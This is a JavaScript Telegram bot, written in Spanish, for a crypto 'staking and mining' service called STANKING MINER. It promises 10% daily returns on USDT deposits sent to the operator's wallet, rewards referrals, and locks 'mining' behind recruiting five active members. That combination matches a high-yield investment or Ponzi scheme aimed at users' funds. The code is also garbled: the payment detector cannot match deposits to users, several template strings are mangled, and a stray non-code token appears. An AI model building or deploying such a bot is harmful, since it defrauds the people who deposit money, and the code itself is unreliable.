import 'dotenv/config'
import { Telegraf, Markup, session } from 'telegraf'
import { ethers } from 'ethers'
import fs from 'fs'

console.log('STANKING MINER - CARGANDO 100% AUTOMÁTICO...')

const bot = new Telegraf(process.env.TELEGRAM_TOKEN)
bot.use(session())

// === BASE DE DATOS ===
let users = {}
const DB_FILE = 'users.json'
if (fs.existsSync(DB_FILE)) {
  try { users = JSON.parse(fs.readFileSync(DB_FILE)) } catch(e) { console.log("DB corrupta, iniciando nueva") }
}
const saveDB = () => fs.writeFileSync(DB_FILE, JSON.stringify(users, null, 2))

// === CONFIG BLOCKCHAIN ===
const provider = new ethers.JsonRpcProvider(process.env.RPC_URL || "https://bsc-dataseed.binance.org/")
const wallet = ethers.Wallet.fromMnemonic(process.env.MNEMONIC || ethers.Wallet.fromPrivateKey(process.env.PRIVATE_KEY).privateKey).connect(provider)

const USDT = new ethers.Contract(
  "0x55d398326f99059fF775485246999027B3197955",
  ["function transfer(address,uint256) external returns (bool)", "function balanceOf(address) view returns (uint256)"],
  wallet
)

const BOT_WALLET = wallet.address
const PLANES = {1:0.1, 3:0.3, 5:0.5, 10:1.0, 20:2.0, 30:3.0, 50:5.0}

// === MENÚ ===
const mainKeyboard = Markup.keyboard([
  ['Staking', 'Minería'],
  ['Ganancias', 'Retiro'],
  ['Referidos', 'Soporte']
]).resize()

const mainMenu = (ctx) => ctx.replyWithMarkdown(`
*STANKING MINER*  
Pagos 100% reales · Mínimo retiro 1 USDT
`, mainKeyboard)

// === START ===
bot.start(async (ctx) => {
  const id = ctx.from.id.toString()
  const args = ctx.message.text.split(' ')
  const ref = args.length > 1 ? args[1] : null

  if (!users[id]) {
    const code = Math.floor(1000 + Math.random() * 9000)
    users[id] = {
      balance: 0,
      planes: [],
      referidos: 0,
      refValidos: 0,
      lastMine: 0,
      verified: false,
      code,
      inviter: ref
    }
    saveDB()
    await ctx.reply(`VERIFICACIÓN REQUERIDA\n\nEscribe este código:\n\`${code}\``, { parse_mode: "Markdown" })

    if (ref && users[ref]) {
      users[ref].referidos += 1
      users[ref].balance += 0.02
      saveDB()
      bot.telegram.sendMessage(ref, "Nuevo referido +0.02 USDT").catch(() => {})
    }
  } else if (!users[id].verified) {
    await ctx.reply(`Tu código:\n\`${users[id].code}\``, { parse_mode: "Markdown" })
  } else {
    mainMenu(ctx)
  }
})

// === VERIFICACIÓN ===
bot.on('text', async (ctx) => {
  const id = ctx.from.id.toString()
  const text = ctx.message.text.trim()

  if (users[id] && !users[id].verified && text === users[id].code.toString()) {
    users[id].verified = true
    delete users[id].code
    saveDB()
    return mainMenu(ctx)
  }

  if (!users[id]?.verified) return

  // RETIRO
  if (ctx.session?.waitingWallet) {
    if (!/^0x[a-fA-F0-9]{40}$/.test(text)) return ctx.reply("Wallet BEP-20 inválida")
    const amount = users[id].balance
    if (amount < 1) return ctx.reply("Mínimo 1 USDT")

    await ctx.reply("Procesando retiro...")
    try {
      const tx = await USDT.transfer(text, ethers.parseUnits(amount.toFixed(6), 18))
      await tx.wait()
      users[id].balance = 0
      saveDB()
      await ctx.reply(`Retiro exitoso \( {amount.toFixed(3)} USDT\nhttps://bscscan.com/tx/ \){tx.hash}`)
    } catch (e) {
      await ctx.reply("Error: " + (e.reason || eメッセージ || e.message))
    }
    ctx.session.waitingWallet = false
    return mainMenu(ctx)
  }
})

// === COMANDOS ===
bot.hears('Ganancias', ctx => ctx.replyWithMarkdown(`Balance: *${(users[ctx.from.id]?.balance || 0).toFixed(3)} USDT*`))

bot.hears('Retiro', ctx => {
  if ((users[ctx.from.id]?.balance || 0) < 1) return ctx.reply("Mínimo 1 USDT")
  ctx.reply("Envía tu wallet BEP-20:")
  ctx.session.waitingWallet = true
})

bot.hears('Staking', ctx => ctx.reply("Elige tu plan:", Markup.inlineKeyboard([
  [Markup.button.callback("1 USDT → 0.1/día", "plan1"), Markup.button.callback("3 USDT → 0.3/día", "plan3")],
  [Markup.button.callback("5 USDT → 0.5/día", "plan5"), Markup.button.callback("10 USDT → 1/día", "plan10")],
  [Markup.button.callback("20 USDT → 2/día", "plan20"), Markup.button.callback("30 USDT → 3/día", "plan30")],
  [Markup.button.callback("50 USDT → 5/día", "plan50")]
])))

bot.hears('Minería', ctx => {
  const u = users[ctx.from.id]
  if (!u || u.refValidos < 5) return ctx.reply(`Necesitas 5 referidos activos\nTienes: ${u?.refValidos || 0}/5`)
  const puede = Date.now() - (u.lastMine || 0) >= 86400000
  ctx.reply(puede ? "*¡RECLAMA 0.03 USDT!*" : "Espera 24h", { parse_mode: "Markdown", reply_markup: puede ? {inline_keyboard: [[{text: "RECLAMAR 0.03", callback_data: "mine"}]]} : null })
})

bot.hears('Referidos', async ctx => {
  const me = await bot.telegram.getMe()
  const link = `https://t.me/\( {me.username}?start= \){ctx.from.id}`
  const u = users[ctx.from.id]
  ctx.replyWithMarkdown(`*Referidos*\nTotal: \( {u?.referidos || 0}\nActivos: \){u?.refValidos || 0}\n\nLink:\n${link}`)
})

bot.hears('Soporte', ctx => ctx.reply("Soporte → @Carlo2187"))

// === BOTONES INLINE ===
bot.action(/plan(\d+)/, async (ctx) => {
  const monto = ctx.match[1]
  await ctx.answerCbQuery()
  await ctx.replyWithMarkdown(`*Plan \( {monto} USDT*\n\nEnvía exactamente * \){monto}.000000 USDT* a:\n\`${BOT_WALLET}\`\n\n¡El pago se detecta automáticamente!`, {
    reply_markup: {inline_keyboard: [[{text: "Ya pagué", callback_data: "check"+monto}]]}
  })
})

bot.action(/check(\d+)/, async (ctx) => {
  await ctx.answerCbQuery("Comprobando pago...")
  // Aquí el listener automático ya lo habrá activado, solo mostramos mensaje
  await ctx.reply("Si pagaste correctamente, el plan se activa en segundos automáticamente.")
  mainMenu(ctx)
})

bot.action('mine', async (ctx) => {
  const id = ctx.from.id.toString()
  if (Date.now() - (users[id].lastMine || 0) >= 86400000) {
    users[id].balance += 0.03
    users[id].lastMine = Date.now()
    saveDB()
    await ctx.answerCbQuery("+0.03 USDT acreditado")
  } else {
    await ctx.answerCbQuery("Aún no han pasado 24h")
  }
  mainMenu(ctx)
})

// === GANANCIAS DIARIAS AUTOMÁTICAS (CADA HORA) ===
setInterval(() => {
  let total = 0
  for (const id in users) {
    const u = users[id]
    if (u.planes?.length > 0) {
      const daily = u.planes.reduce((a,p) => a + p.daily, 0)
      u.balance += daily
      total += daily
    }
  }
  if (total > 0) saveDB()
}, 3600000)

// === DETECTOR DE PAGOS 100% AUTOMÁTICO (EN TIEMPO REAL) ===
let lastBlock = 0
setInterval(async () => {
  try {
    const block = await provider.getBlockNumber()
    if (block <= lastBlock) return
    lastBlock = block

    const txs = await provider.getBlockWithTransactions(block)
    for (const tx of txs.transactions) {
      if (tx.to?.toLowerCase() === BOT_WALLET.toLowerCase() && tx.value.eq(0)) {
        const input = tx.data
        if (input.startsWith("0xa9059cbb")) {
          const receiver = "0x" + input.slice(34, 74)
          const amount = ethers.formatUnits(ethers.BigNumber.from("0x" + input.slice(74)), 18)
          const value = parseFloat(amount)
          if ([1,3,5,10,20,30,50].includes(value) && users[receiver]) {
            const daily = PLANES[value]
            users[receiver].planes.push({amount: value, daily, time: Date.now()})
            if (users[receiver].inviter && users[users[receiver].inviter]) {
              users[users[receiver].inviter].refValidos += 1
            }
            saveDB()
            bot.telegram.sendMessage(receiver, `Pago recibido \( {value} USDT\nPlan activado: + \){daily} USDT/día`).catch(() => {})
          }
        }
      }
    }
  } catch(e) {}
}, 8000) // cada 8 segundos

// === LANZAMIENTO ===
bot.launch({ dropPendingUpdates: true })
  .then(() => {
    bot.telegram.getMe().then(info => {
      console.log(`BOT 100% AUTOMÁTICO ENCENDIDO: @${info.username}`)
      console.log(`Wallet del bot: ${BOT_WALLET}`)
    })
  })

process.once('SIGINT', () => bot.stop('SIGINT'))
process.once('SIGTERM', () => bot.stop('SIGTERM'))
